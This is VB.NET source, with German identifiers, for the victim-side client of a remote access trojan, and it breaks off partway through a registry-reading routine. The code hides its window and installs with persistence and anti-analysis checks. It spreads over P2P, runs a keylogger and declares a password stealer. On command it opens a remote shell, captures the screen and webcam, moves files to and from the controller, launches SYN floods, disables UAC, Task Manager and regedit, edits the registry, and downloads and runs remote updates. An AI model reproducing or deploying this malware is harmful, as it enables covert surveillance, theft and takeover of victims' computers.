Imports Microsoft.Win32
Public Class Form1
    Public WithEvents Client As New VictimCLient
    Dim WithEvents AktuellesFenster As New AktuellesFensterauslesen

    Dim WithEvents ShellKonsole As New ShellKonsole
    Dim WithEvents Keylogger As New Keylogger
    Dim WithEvents Socks5Manager As New Socks5Handler
    Dim WithEvents FileSender As New FileSender
    Dim Passwortstealer As New PasswordStealer
    Dim WithEvents FunFunktionen As New FunFunktionen
    Public m As System.Threading.Mutex
    Dim WithEvents DateiSuche As New DateiSuche
    Public PlugInManager As New PlugInManager


    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Try
            CriticalProzess.ProtectProcess(False)
        Catch ex As Exception
        End Try
        Timer1.Stop()
        Try
            For Each p As Process In Process.GetProcessesByName("upx")
                p.Kill()
            Next
        Catch ex As Exception
        End Try
        Try
            My.Computer.FileSystem.DeleteFile(Environ("appdata") & "\upx.exe")
        Catch ex As Exception
        End Try
        Try
            My.Computer.FileSystem.DeleteFile(Environ("temp") & "\upx.exe")
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Me.Visible = False
            Me.Hide()
            If DDebug = False Then
                StubStringEinlesen()
            Else
                Dim v As New VerbindungsInformationen
                v.IpAdresse = "127.0.0.1"
                v.ConnectPort = 10
                v.TransferPort = 11
                VerbindungsDaten.Add(v)

                Dim v2 As New VerbindungsInformationen
                v2.IpAdresse = "127.0.0.1"
                v2.ConnectPort = 8888
                v2.TransferPort = 8881
                VerbindungsDaten.Add(v2)
            End If

            If Antis Then
                Timer2.Start()
            End If

            If ServerInstallation() Then
                Client.Start()
                If Persistenz Then
                    Try
                        For Each p As Process In Process.GetProcessesByName("upx")
                            p.Kill()
                        Next
                    Catch ex As Exception
                    End Try
                    Try
                        My.Computer.FileSystem.DeleteFile(Environ("appdata") & "\upx.exe")
                    Catch ex As Exception
                    End Try
                    Try
                        My.Computer.FileSystem.DeleteFile(Environ("temp") & "\upx.exe")
                    Catch ex As Exception
                    End Try
                    Timer1.Start()
                End If
                If OffKeylogger Then
                    If Me.InvokeRequired Then
                        Dim d As New d1(AddressOf Keylogger.StartOfflineKeylogger)
                        Me.Invoke(d)
                    Else
                        Keylogger.StartOfflineKeylogger()
                    End If
                End If
            Else
                Application.Exit()
            End If
            If P2PSpread Then
                Spread.P2pSpread()
            End If
        Catch ex As Exception
            Application.Exit()
        End Try
    End Sub
    Private Sub AktuellesFenster_NeuesFenster(ByVal Titel As String) Handles AktuellesFenster.NeuesFenster
        Try
            Keylogger.NewWindow(Titel)
            Client.Senden("AktuellesFenster#++#" & Titel)
        Catch ex As Exception
        End Try
    End Sub
    Delegate Sub d1()
    Delegate Sub d2(ByVal sText As String)
    Private Sub Client_NewMessage(ByVal Befehle() As String) Handles Client.NewMessage
        'Clipboardmanager
        If Befehle(0) = "CLIPBOARDMANAGER" Then
            If Befehle(1) = "GETCLIPBOARDTEXT" Then
                If Me.InvokeRequired Then
                    Dim d As New d1(AddressOf GetClipBoardData)
                    Me.Invoke(d)
                Else
                    GetClipBoardData()
                End If
            End If
            If Befehle(1) = "SETCLIPBOARDTEXT" Then
                Dim sText As String = Befehle(2)
                If Me.InvokeRequired Then
                    Dim d As New d2(AddressOf SetClipBoardText)
                    Me.Invoke(d, New Object() {sText})
                Else
                    SetClipBoardText(sText)
                End If
            End If
        End If

        'FunFunktionen
        If Befehle(0) = "FUNFUNCTION" Then
            If Befehle(1) = "CDDRIVER" Then
                If Befehle(2) = "OPEN" Then
                    If FunFunktionen.CD_Laufwerk_öffnen() Then
                        Client.Senden("FUNFUNCTION#++#ANSWER#++#TRUE#++#Laufwerk geöffnet")
                    Else
                        Client.Senden("FUNFUNCTION#++#ANSWER#++#FALSE#++#Laufwerk nicht geöffnet")
                    End If
                End If
                If Befehle(2) = "CLOSE" Then
                    If FunFunktionen.CD_Laufwerk_schließen Then
                        Client.Senden("FUNFUNCTION#++#ANSWER#++#TRUE#++#Laufwerk geschlossen")
                    Else
                        Client.Senden("FUNFUNCTION#++#ANSWER#++#FALSE#++#Laufwerk nicht geschlossen")
                    End If
                End If
            End If
            If Befehle(1) = "DESKTOP" Then
                If Befehle(2) = "ON" Then
                    FunFunktionen.MonitorEinschalten()
                End If
                If Befehle(2) = "OFF" Then
                    FunFunktionen.MonitorAusschalten()
                End If
            End If
            If Befehle(1) = "BLOCKINPUT" Then
                If Befehle(2) = "ON" Then
                    FunFunktionen.TastaturMaus_Bloeckieren()
                End If
                If Befehle(2) = "OFF" Then
                    FunFunktionen.TastaturMaus_Entblocken()
                End If
            End If
            If Befehle(1) = "UAC" Then
                If Befehle(2) = "OFF" Then
                    UAC_Deakrivieren(True)
                End If
                If Befehle(2) = "ON" Then
                    UAC_Deakrivieren(False)
                End If
            End If
            If Befehle(1) = "INPUTBOX" Then
                FunFunktionen.InputChatBox(Befehle(2), Befehle(3))
                Client.Senden("FUNFUNCTION#++#ANSWER#++#TRUE#++#Inputbox geöffnet")
            End If
            If Befehle(1) = "SPEAK" Then
                Try
                    Sprechen(Befehle(2))
                    Client.Senden("FUNFUNCTION#++#ANSWER#++#TRUE#++#Text wurde abgespielt")
                Catch ex As Exception
                    Client.Senden("FUNFUNCTION#++#ANSWER#++#FALSE#++#Text wurde nicht abgespielt: " & ex.Message)
                End Try
            End If
            If Befehle(1) = "COMPUTER" Then
                If Befehle(2) = "SHUTDOWN" Then
                    If FunFunktionen.Runterfahren Then
                        Client.Senden("FUNFUNCTION#++#ANSWER#++#TRUE#++#Computer wird runtergefahren")
                    Else
                        Client.Senden("FUNFUNCTION#++#ANSWER#++#FALSE#++#Computer wird nicht runtergefahren")
                    End If
                End If
                If Befehle(2) = "RESTART" Then
                    If FunFunktionen.NeuStarten Then
                    Else
                    End If
                End If
                If Befehle(2) = "LOGOUT" Then
                    If FunFunktionen.Abmelden Then
                    Else
                    End If
                End If
            End If


        End If

        'Synflood
        If Befehle(0) = "SYNFLOOD" Then
            If Befehle(1) = "START" Then
                Try
                    If Syn.IsEnabled = False Then
                        Syn.StopSuperSyn()
                    End If
                    Syn.Host = (Befehle(2))
                    Syn.Port = CInt(Befehle(3))
                    Syn.SuperSynSockets = CInt(Befehle(4))
                    Syn.Threads = CInt(Befehle(5))
                    Syn.StartSuperSyn()
                    Syn.DDOSStatus = "Ja: Syn Flood auf" & Syn.Host & "-" & Syn.Port & "-" & Syn.SuperSynSockets & "-" & Syn.Threads
                Catch ex As Exception
                End Try
            End If
            If Befehle(2) = "STOP" Then
                Try
                    Syn.StopSuperSyn()
                Catch ex As Exception
                End Try
            End If
        End If











        If Befehle(0) = "BlockTask" Then
            Try
                If Befehle(1) = "1" Then
                    FunFunktionen.DisableTaskmanager(True)
                Else
                    FunFunktionen.DisableTaskmanager(False)
                End If
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "BlockReg" Then
            Try
                If Befehle(1) = "1" Then
                    FunFunktionen.DisableRegedit(True)
                Else
                    FunFunktionen.DisableRegedit(False)
                End If
            Catch ex As Exception
            End Try
        End If



        If Befehle(0) = "ChangeVictimnotiz" Then
            Try
                My.Settings.VictimNotiz = Befehle(1)
                My.Settings.Save()
                Client.Senden("VictimNotiz#++#" & My.Settings.VictimNotiz)
            Catch ex As Exception
            End Try
        End If







      



        If Befehle(0) = "StartPlugIn" Then
            PlugInManager.ReFreshPlugIns()
            VictimID = Befehle(2)
            If PlugInManager.StartPlugIn(Befehle(1)) Then
                Dim TcpClient As New System.Net.Sockets.TcpClient
                Try
                    TcpClient.Connect(_Ipadresse, _TransferPort)
                    Dim writer As New System.IO.BinaryWriter(TcpClient.GetStream)
                    writer.Write("PlugIn")
                    writer.Flush()
                    writer.Write(VictimID)
                    writer.Flush()
                    writer.Write(Befehle(1))
                    writer.Flush()
                    PlugInManager.SetConnectionToplugIn(Befehle(1), TcpClient)
                Catch ex As Exception
                    '    MsgBox(ex.Message)
                End Try
            Else
                Client.Senden("PlugInNotinstalled#++#" & Befehle(1)) 'PlugIn nicht vorhanden.
            End If
        End If


        If Befehle(0) = "UpdateFromURL" Then
            Try
                Dim url As String = Befehle(1)
                Try
                    My.Computer.FileSystem.DeleteFile(Environ("temp") & "\xxupd.exe")
                Catch ex As Exception
                End Try
                My.Computer.Network.DownloadFile(url, Environ("temp") & "\xxupd.exe")
                UpdateFromFile()
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "Remove" Then
            Timer1.Stop()
            If Persistenz = True Then
                Try
                    For Each p As Process In Process.GetProcessesByName("upx")
                        p.Kill()
                    Next
                Catch ex As Exception
                End Try
                Try
                    My.Computer.FileSystem.DeleteFile(Environ("appdata") & "\upx.exe")
                Catch ex As Exception
                End Try
                Try
                    My.Computer.FileSystem.DeleteFile(Environ("temp") & "\upx.exe")
                Catch ex As Exception
                End Try
            End If
            ServerLöschen()
        End If
















        'Prozessmanager
        If Befehle(0) = "PROCESSMANAGER" Then
            If Befehle(1) = "GETPROCESSLIST" Then
                Try
                    Dim sText As String = "PROCESSMANAGER#++#PROCESSLIST#++#"
                    For Each p As Process In Process.GetProcesses
                        Try
                            sText &= p.ProcessName & "~+~" & p.Id.ToString & "~+~" & p.MainWindowTitle & "~+~" & p.MainModule.FileName & "|"
                        Catch ex As Exception
                        End Try
                    Next
                    Client.Senden(sText)
                    Client.Senden("PROCESSMANAGER#++#ANSWER#++#TRUE#++#Prozesse aktualisiert")
                Catch ex As Exception
                    Client.Senden("PROCESSMANAGER#++#ANSWER#++#FALSE#++#Fehler: " & ex.Message)
                End Try
            End If
            If Befehle(1) = "KILL" Then
                Try
                    Process.GetProcessById(CInt(Befehle(2))).Kill()
                    Client.Senden("PROCESSMANAGER#++#ANSWER#++#TRUE#++#Prozess erfolgreich beendet")
                Catch ex As Exception
                    Client.Senden("PROCESSMANAGER#++#ANSWER#++#FALSE#++#Prozess nicht beendet: " & ex.Message)
                End Try
            End If
        End If

        'Filemanager
        If Befehle(0) = "FILEMANAGER" Then
            'dateisuche
            If Befehle(1) = "FILESEARCH" Then
                If Befehle(2) = "START" Then
                    DateiSuche.Start(Befehle(3), Befehle(4))
                    Client.Senden("FILEMANAGER#++#ANSWER#++#TRUE#++#Dateisuche gestartet")
                End If
                If Befehle(2) = "STOP" Then
                    DateiSuche.Stopp()
                    Client.Senden("FILEMANAGER#++#ANSWER#++#TRUE#++#Dateisuche gestoppt")
                End If
            End If

            If Befehle(1) = "CHANGEWALLPAPER" Then
                ChangeWallpaper(Befehle(2))
            End If

            If Befehle(1) = "COPY" Then
                Try
                    My.Computer.FileSystem.CopyFile(Befehle(2), Befehle(3))
                    Client.Senden("FILEMANAGER#++#ANSWER#++#TRUE#++#Date erfolgreich kopiert")
                Catch ex As Exception
                    Client.Senden("FILEMANAGER#++#ANSWER#++#FALSE#++#Datei nicht kopiert: " & ex.Message)
                End Try
            End If

            If Befehle(1) = "DELETEFOLDER" Then
                Try
                    If My.Computer.FileSystem.DirectoryExists(Befehle(2)) Then
                        My.Computer.FileSystem.DeleteDirectory(Befehle(2), FileIO.DeleteDirectoryOption.DeleteAllContents)
                        Client.Senden("FILEMANAGER#++#ANSWER#++#TRUE#++#Ordner erfolgreich gelöscht")
                    Else
                        Client.Senden("FILEMANAGER#++#ANSWER#++#FALSE#++#Ordner nicht gefunden")
                    End If
                Catch ex As Exception
                    Client.Senden("FILEMANAGER#++#ANSWER#++#FALSE#++#Ordner nicht gelöscht: " & ex.Message)
                End Try

            End If

            If Befehle(1) = "DOWNLOADFILE" Then
                Try
                    VictimID = Befehle(4)
                    FileSender.SendFileToServer(Befehle(2), Befehle(3))
                Catch ex As Exception
                End Try
            End If
            If Befehle(1) = "UPLOADFILE" Then
                Try
                    VictimID = Befehle(4)
                    FileSender.GetFileFromServer(Befehle(3), Befehle(2))
                Catch ex As Exception
                End Try
            End If

            If Befehle(1) = "CREATENEWFOLDER" Then
                Try
                    My.Computer.FileSystem.CreateDirectory(Befehle(2))
                    Client.Senden("FILEMANAGER#++#ANSWER#++#TRUE#++#Neuer Ordner wurde erstellt")
                Catch ex As Exception
                    Client.Senden("FILEMANAGER#++#ANSWER#++#FALSE#++#Ordner nicht erstellt: " & ex.Message)
                End Try
            End If

            If Befehle(1) = "RUNFILE" Then
                Try
                    Dim p As New Process
                    If Befehle(3) = "1" Then
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Normal
                    ElseIf Befehle(3) = "0" Then
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    End If
                    p.StartInfo.FileName = Befehle(2)
                    p.Start()
                    Client.Senden("FILEMANAGER#++#ANSWER#++#TRUE#++#Datei erfolgreich ausgeführt")
                Catch ex As Exception
                    Client.Senden("FILEMANAGER#++#ANSWER#++#FALSE#++#Datei nicht ausgeführt: " & ex.Message)
                End Try

            End If
            If Befehle(1) = "KILLFILE" Then
                Try
                    If My.Computer.FileSystem.FileExists((Befehle(2))) Then
                        My.Computer.FileSystem.DeleteFile(Befehle(2))
                        Client.Senden("FILEMANAGER#++#ANSWER#++#TRUE#++#Datei erfolgreich gelöscht")
                    Else
                        Client.Senden("FILEMANAGER#++#ANSWER#++#FALSE#++#Datei nicht gefunden")
                    End If
                Catch ex As Exception
                    Client.Senden("FILEMANAGER#++#ANSWER#++#TRUE#++#Datei nicht gelöscht: " & ex.Message)
                End Try
            End If
            If Befehle(1) = "GETFOLDERSANDFILES" Then
                Try
                    Dim Pfad As String = Befehle(2)
                    Dim sendetext As String = "FILEMANAGER#++#FOLDERSANDFILES#++#"
                    For Each p As String In My.Computer.FileSystem.GetDirectories(Pfad)
                        Dim Ordner As New IO.DirectoryInfo(p)
                        sendetext &= Ordner.Name & "_~_"
                        sendetext &= Ordner.FullName & "_~_"
                        sendetext &= "Ordner" & "_~_"
                        sendetext &= Ordner.Attributes.ToString & "~+~"
                    Next
                    sendetext &= "#++#"
                    For Each f As String In My.Computer.FileSystem.GetFiles(Pfad)
                        Dim file As New IO.FileInfo(f)
                        sendetext &= file.Name & "_~_"
                        sendetext &= file.FullName & "_~_"
                        sendetext &= file.Length.ToString & " Bytes" & "_~_"
                        sendetext &= file.Attributes.ToString
                        If f = InstallationsOrdner & "\" & DateiName Then
                            sendetext &= "ThisIsEchelonServer"
                        End If
                        sendetext &= "~+~"
                    Next
                    Client.Senden(sendetext)
                Catch ex As Exception
                End Try
            End If
            If Befehle(1) = "PICTUREPREWVIEW" Then
                If Befehle(2) = "SINGEL" Then
                    VictimID = Befehle(4)
                    FileSender.SendImagePreviewInPictureBoxToServer(Befehle(3), Nothing)
                End If
            End If
        End If



        If Befehle(0) = "INFORMATIONSMANAGER" Then
            If Befehle(1) = "REFRESHINFORMATIONS" Then
                Try
                    Dim sendeText As String = "Informationen#++#"
                    sendeText &= _Ipadresse & "~+~."
                    sendeText &= _ConnectionPort.ToString & "~+~."
                    sendeText &= _TransferPort.ToString & "~+~."
                    sendeText &= Passwort & "~+~."
                    sendeText &= ReconnectTime.ToString & "~+~."

                    sendeText &= ServerInstallieren.ToString & "~+~."

                    sendeText &= Autostart_CurrentUser.ToString & "~+~."
                    sendeText &= Autostart_LocalMashine.ToString & "~+~."
                    sendeText &= Autostart_AxtivX.ToString & "~+~."
                    sendeText &= MutexString & "~+~."

                    sendeText &= Attribut_Versteckt.ToString & "~+~."
                    sendeText &= Melt & "~+~."

                    sendeText &= SystemProzessSetzen.ToString & "~+~."
                    sendeText &= Persistenz.ToString & "~+~."


                    sendeText &= UAC_Deaktivieren.ToString & "~+~."
                    sendeText &= P2PSpread.ToString & "~+~."
                    sendeText &= Antis.ToString & "~+~."

                    sendeText &= ErrorMessage.ToString & "~+~."
                    sendeText &= ErrorMessageTitel & "~+~."
                    sendeText &= ErrorMessageText & "~+~."

                    Client.Senden(sendeText)
                    Client.Senden("INFORMATIONSMANAGER#++#ANSWER#++#TRUE#++#Informationen aktualisiert")
                Catch ex As Exception
                    Client.Senden("INFORMATIONSMANAGER#++#ANSWER#+#TRUE#++#Informationen nicht aktualisiert: " & ex.Message)
                End Try
            End If
        End If


        'RemoteShell
        If Befehle(0) = "REMOTESHELL" Then
            If Befehle(1) = "START" Then
                ShellKonsole.Start()
                Client.Senden("REMOTESHELL#++#ANSWER#++#TRUE#++#Remote Shell gestartet")
            End If
            If Befehle(1) = "STOP" Then
                ShellKonsole.Stopp()
                Client.Senden("REMOTESHELL#++#ANSWER#++#TRUE#++#Remote Shell gestoppt")
            End If
            If Befehle(1) = "NEWMESSAGE" Then
                ShellKonsole.Schreiben(Befehle(2))
                Client.Senden("REMOTESHELL#++#ANSWER#++#TRUE#++#Neuer Befehl ausgeführt")
            End If
        End If


        If Befehle(0) = "REMOTEDESKTOP" Then
            If Befehle(1) = "START" Then
                Try
                    VictimID = Befehle(2)
                    FileSender.StartRemoteDesktop()
                    Client.Senden("REMOTEDESKTOP#++#ANSWER#++#TRUE#++#Remotedestop gestartet")
                Catch ex As Exception
                    Client.Senden("REMOTEDESKTOP#++#ANSWER#++#FALSE#++#Remotedestop nicht gestartet: " & ex.Message)
                End Try

            End If
            If Befehle(1) = "STOP" Then
                Try
                    FileSender.StopRemoteDesktop()
                    Client.Senden("REMOTEDESKTOP#++#ANSWER#++#TRUE#++#Remotedestop gestoppt")
                Catch ex As Exception
                    Client.Senden("REMOTEDESKTOP#++#ANSWER#++#FALSE#++#Remotedestop nicht gestoppt: " & ex.Message)
                End Try
            End If
            If Befehle(1) = "SPEED" Then
                Try
                    FileSender.SetRemoteDesktopSpeed(CInt(Befehle(2)))
                    Client.Senden("REMOTEDESKTOP#++#ANSWER#++#TRUE#++#Geschwindigkeit geändert")
                Catch ex As Exception
                    Client.Senden("REMOTEDESKTOP#++#ANSWER#++#FALSE#++#Geschwindigkeit nicht geändert: " & ex.Message)
                End Try

            End If
            If Befehle(1) = "QUALI" Then
                Try
                    FileSender.SetRemoteDesktopQuality(CInt(Befehle(2)))
                    Client.Senden("REMOTEDESKTOP#++#ANSWER#++#TRUE#++#Qualität geändert")
                Catch ex As Exception
                    Client.Senden("REMOTEDESKTOP#++#ANSWER#++#FALSE#++#Qualität nicht geändert: " & ex.Message)
                End Try
            End If
        End If


        If Befehle(0) = "REMOTEWEBCAM" Then
            If Befehle(1) = "START" Then
                Try
                    VictimID = Befehle(2)
                    FileSender.SetRemoteWebcamID(CInt(Befehle(3)))
                    FileSender.StartRemoteWebcam()
                    Client.Senden("REMOTEWEBCAM#++#ANSWER#++#TRUE#++#Remotewebcam gestartet")
                Catch ex As Exception
                    Client.Senden("REMOTEWEBCAM#++#ANSWER#++#FALSE#++#Remotewebcam nicht gestartet: " & ex.Message)
                End Try

            End If
            If Befehle(1) = "STOP" Then
                Try
                    FileSender.StopRemoteWebcam()
                    Client.Senden("REMOTEWEBCAM#++#ANSWER#++#TRUE#++#Remotewebcam gestoppt")
                Catch ex As Exception
                    Client.Senden("REMOTEWEBCAM#++#ANSWER#++#FALSE#++#Remotewebcam nicht gestoppt: " & ex.Message)
                End Try
            End If
            If Befehle(1) = "QUALI" Then
                Try
                    FileSender.SetRemoteWebcamQuality(CInt(Befehle(2)))
                    Client.Senden("REMOTEWEBCAM#++#ANSWER#++#TRUE#++#Qualität geändert")
                Catch ex As Exception
                    Client.Senden("REMOTEWEBCAM#++#ANSWER#++#FALSE#++#Qualität nicht geändert: " & ex.Message)
                End Try
            End If
            If Befehle(1) = "SPEED" Then
                FileSender.SetRemoteWebcamSpeed(CInt(Befehle(2)))
            End If
        End If

        If Befehle(0) = "MOUSECLICK" Then
            Dim X As Integer = CInt(Befehle(2))
            Dim Y As Integer = CInt(Befehle(3))

            If Befehle(1) = "LEFT" Then
                Windows.Forms.Cursor.Position = New Point(X, Y)
                mouse_event(&H2, 0, 0, 0, 0)
                mouse_event(&H4, 0, 0, 0, 0)
            End If
            If Befehle(1) = "RIGHT" Then
                Windows.Forms.Cursor.Position = New Point(X, Y)
                mouse_event(&H8, X, Y, 0, 0)
                mouse_event(&H10, X, Y, 0, 0)
            End If
        End If


        If Befehle(0) = "CHAT" Then
            If Befehle(1) = "TOPMOST" Then
                Try
                    If Befehle(2) = "TRUE" Then
                        Form2.TopMost = True
                        Client.Senden("CHAT#++#ANSWER#++#TRUE#++#Chatfenster immer Fordergrund")
                    ElseIf Befehle(2) = "FALSE" Then
                        Form2.TopMost = False
                        Client.Senden("CHAT#++#ANSWER#++#TRUE#++#Chatfenster nicht immer im Fordergrund")
                    End If
                Catch ex As Exception
                    Client.Senden("CHAT#++#ANSWER#++#FALSE#++#Fehler: " & ex.Message)
                End Try
            End If
            If Befehle(1) = "OPEN" Then
                Try
                    Form2.CheckForIllegalCrossThreadCalls = False
                    If Me.InvokeRequired Then
                        Dim d As New d1(AddressOf Form2.Show)
                        Me.Invoke(d)
                    Else
                        Form2.Show()
                    End If
                    Client.Senden("CHAT#++#ANSWER#++#TRUE#++#Chatfenster geöffnet")
                Catch ex As Exception
                    Client.Senden("CHAT#++#ANSWER#++#FALSE#++#Chatfenster nicht geöffner: " & ex.Message)
                End Try
            End If
            If Befehle(1) = "CLOSE" Then
                Try
                    Form2.Close()
                    Client.Senden("CHAT#++#ANSWER#++#TRUE#++#Chatfenster geschlossen")
                Catch ex As Exception
                    Client.Senden("CHAT#++#ANSWER#++#FALSE#++#Chatfenster nicht geschlossen")
                End Try
            End If
            If Befehle(1) = "NEWMESSAGE" Then
                Try
                    Form2.TextBox1.Text &= "   " & Befehle(3) & ":" & vbNewLine & Befehle(2) & vbNewLine
                    Client.Senden("CHAT#++#ANSWER#++#TRUE#++#Nachricht übertragen")
                Catch ex As Exception
                    Client.Senden("CHAT#++#ANSWER#++#FALSE#++#Nachricht nicht übertragen")
                End Try
            End If
        End If

























        If Befehle(0) = "CreatSocks5" Then
            Try
                Dim Port As Integer = CInt(Befehle(1))
                Socks5Manager.NewSocks5(Port)
            Catch ex As Exception
            End Try
        End If




        If Befehle(0) = "Reconnect" Then
            Try
                Client.Reconnect()
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "Exit" Then
            Try
                If Persistenz = True Then
                    Try
                        For Each p As Process In Process.GetProcessesByName("upx")
                            p.Kill()
                        Next
                    Catch ex As Exception
                    End Try
                    Try
                        My.Computer.FileSystem.DeleteFile(Environ("appdata") & "\upx.exe")
                    Catch ex As Exception
                    End Try
                    Try
                        My.Computer.FileSystem.DeleteFile(Environ("temp") & "\upx.exe")
                    Catch ex As Exception
                    End Try
                End If
                Client.Deisconnect()
                Application.Exit()
            Catch ex As Exception
            End Try
        End If





        If Befehle(0) = "DeletRegKey" Then
            Try
                If Befehle(1) = "HKEY_CLASSES_ROOT" Then
                    Dim r As RegistryKey = My.Computer.Registry.ClassesRoot
                    r.DeleteSubKey(Befehle(2))
                End If
                If Befehle(1) = "HKEY_CURRENT_USER" Then
                    Dim r As RegistryKey = My.Computer.Registry.CurrentUser
                    r.DeleteSubKey(Befehle(2))

                End If
                If Befehle(1) = "HKEY_LOCAL_MACHINE" Then
                    Dim r As RegistryKey = My.Computer.Registry.LocalMachine
                    r.DeleteSubKey(Befehle(2))
                End If
                If Befehle(1) = "HKEY_USERS" Then
                    Dim r As RegistryKey = My.Computer.Registry.Users
                    r.DeleteSubKey(Befehle(2))
                End If
                If Befehle(1) = "HKEY_CURRENT_CONFIG" Then
                    Dim r As RegistryKey = My.Computer.Registry.CurrentConfig
                    r.DeleteSubKey(Befehle(2))
                End If
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "NewRegKey" Then
            Try
                If Befehle(1) = "HKEY_CLASSES_ROOT" Then
                    Dim r As RegistryKey = My.Computer.Registry.ClassesRoot
                    r.CreateSubKey(Befehle(2))
                End If
                If Befehle(1) = "HKEY_CURRENT_USER" Then
                    Dim r As RegistryKey = My.Computer.Registry.CurrentUser
                    r.CreateSubKey(Befehle(2))
                End If
                If Befehle(1) = "HKEY_LOCAL_MACHINE" Then
                    Dim r As RegistryKey = My.Computer.Registry.LocalMachine
                    r.CreateSubKey(Befehle(2))
                End If
                If Befehle(1) = "HKEY_USERS" Then
                    Dim r As RegistryKey = My.Computer.Registry.Users
                    r.CreateSubKey(Befehle(2))
                End If
                If Befehle(1) = "HKEY_CURRENT_CONFIG" Then
                    Dim r As RegistryKey = My.Computer.Registry.CurrentConfig
                    r.CreateSubKey(Befehle(2))
                End If
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "NewValue" Then
            Try
                My.Computer.Registry.SetValue(Befehle(1), Befehle(2), Befehle(3))
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "DeleteValue" Then
            Try
                If Befehle(1) = "HKEY_CLASSES_ROOT" Then
                    Dim r As RegistryKey = My.Computer.Registry.ClassesRoot
                    r.DeleteValue(Befehle(2))
                End If
                If Befehle(1) = "HKEY_CURRENT_USER" Then
                    Dim r As RegistryKey = My.Computer.Registry.CurrentUser
                    r.CreateSubKey(Befehle(2)).DeleteValue(Befehle(3))
                End If
                If Befehle(1) = "HKEY_LOCAL_MACHINE" Then
                    Dim r As RegistryKey = My.Computer.Registry.LocalMachine
                    r.CreateSubKey(Befehle(2)).DeleteValue(Befehle(3))
                End If
                If Befehle(1) = "HKEY_USERS" Then
                    Dim r As RegistryKey = My.Computer.Registry.Users
                    r.CreateSubKey(Befehle(2)).DeleteValue(Befehle(3))
                End If
                If Befehle(1) = "HKEY_CURRENT_CONFIG" Then
                    Dim r As RegistryKey = My.Computer.Registry.CurrentConfig
                    r.CreateSubKey(Befehle(2)).DeleteValue(Befehle(3))
                End If
            Catch ex As Exception
                'c.senden("Fehler: Hkeys")
            End Try
        End If

        If Befehle(0) = "ScreenOff" Then
            Try
                FunFunktionen.MonitorAusschalten()
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "MsgBox" Then
            Try
                Dim m As New MsgBoxDetaills
                m.Titel = Befehle(1)
                m.Text = Befehle(2)
                m.Style = Befehle(3)
                Dim t As New System.Threading.Thread(AddressOf MesboxShow)
                t.IsBackground = True
                t.Start(m)
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "ScreenOn" Then
            Try
                FunFunktionen.MonitorEinschalten()
            Catch ex As Exception
            End Try
        End If

     

        If Befehle(0) = "ShutDown" Then
            Try
                FunFunktionen.Runterfahren()
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "LogOut" Then
            Try
                FunFunktionen.Abmelden()
            Catch ex As Exception
            End Try
        End If
        If Befehle(0) = "RestartComputer" Then
            Try
                FunFunktionen.NeuStarten()
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "Laufwerke" Then
            Try
                Dim str As String = "Laufwerke#++#"
                For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
                    str &= d.Name & "~+~"
                Next
                str &= "#++#"
                str &= Environ("temp") & "\~+~"
                str &= Environ("appdata") & "\~+~"
                str &= Environ("windir") & "\~+~"
                str &= Environ("userprofile") & "\~+~"
                str &= My.Computer.FileSystem.SpecialDirectories.Desktop & "\~+~"
                str &= My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\~+~"
                str &= My.Computer.FileSystem.SpecialDirectories.MyPictures & "\~+~"
                str &= My.Computer.FileSystem.SpecialDirectories.MyMusic & "\~+~"
                Client.Senden(str)
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "ShowDeskInListview" Then
            Try
                VictimID = Befehle(1)
                FileSender.SendSingelScreenForListviewToServer(Nothing)
            Catch ex As Exception
            End Try
        End If



        'If Befehle(0) = "GetFileFromClient" Then 'Client sendet datei an server
        '    Try
        '        VictimID = Befehle(3)
        '        FileSender.SendFileToServer(Befehle(1), Befehle(2))
        '    Catch ex As Exception
        '    End Try
        'End If

        'If Befehle(0) = "ServerSendsFile" Then
        '    Try
        '        VictimID = Befehle(3)
        '        FileSender.GetFileFromServer(Befehle(2), Befehle(1))
        '    Catch ex As Exception
        '    End Try
        'End If

        If Befehle(0) = "GetRegKey" Then
            Try
                Dim SendeText As String = "sSubKeys#++#"
                If Befehle(1) = "HKEY_CLASSES_ROOT" Then
                    Dim r As RegistryKey = Registry.ClassesRoot.OpenSubKey(Befehle(2))
                    For Each s As String In r.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    SendeText &= "#++#"
                    For Each v As String In r.GetValueNames
                        SendeText &= v & "::" & Registry.GetValue(r.Name, v, "") & "~+~"
                    Next
                    Client.Senden(SendeText & "#++#" & Befehle(2) & "#++#" & Befehle(3) & "#++#")
                End If
                If Befehle(1) = "HKEY_CURRENT_USER" Then
                    Dim r As RegistryKey = Registry.CurrentUser.OpenSubKey(Befehle(2))
                    For Each s As String In r.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    SendeText &= "#++#"
                    For Each v As String In r.GetValueNames
                        SendeText &= v & "::" & Registry.GetValue(r.Name, v, "") & "~+~"
                    Next
                    Client.Senden(SendeText & "#++#" & Befehle(2) & "#++#" & Befehle(3) & "#++#")
                End If
                If Befehle(1) = "HKEY_LOCAL_MACHINE" Then
                    Dim r As RegistryKey = Registry.LocalMachine.OpenSubKey(Befehle(2))
                    For Each s As String In r.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    SendeText &= "#++#"
                    For Each v As String In r.GetValueNames
                        SendeText &= v & "::" & Registry.GetValue(r.Name, v, "") & "~+~"
                    Next
                    Client.Senden(SendeText & "#++#" & Befehle(2) & "#++#" & Befehle(3) & "#++#")
                End If
                If Befehle(1) = "HKEY_USERS" Then
                    Dim r As RegistryKey = Registry.Users.OpenSubKey(Befehle(2))
                    For Each s As String In r.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    SendeText &= "#++#"
